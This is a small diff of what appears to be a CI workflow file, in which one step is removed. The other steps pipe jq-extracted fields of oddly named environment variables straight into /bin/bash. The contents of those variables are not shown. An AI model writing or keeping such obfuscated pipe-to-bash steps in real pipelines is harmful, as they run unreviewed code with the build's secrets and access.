@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$eejo2" | jq -r .lln14838 | /bin/bash
           printf '%s' "$ht19355" | jq -r .q434 | /bin/bash
           printf '%s' "$y5" | jq -r .gtp121 | /bin/bash
-          printf '%s' "$z9" | jq -r .or684 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
